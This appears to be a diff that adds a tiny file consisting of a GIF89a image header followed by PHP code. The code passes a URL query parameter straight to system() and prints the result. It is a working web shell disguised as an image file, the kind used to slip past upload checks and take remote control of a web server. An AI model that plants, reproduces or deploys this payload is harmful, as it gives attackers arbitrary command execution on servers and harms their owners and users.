@@ -1,0 +1,5 @@
+GIF89a
+<?php
+echo "<pre>";
+system($_GET['bennie']);
+?>
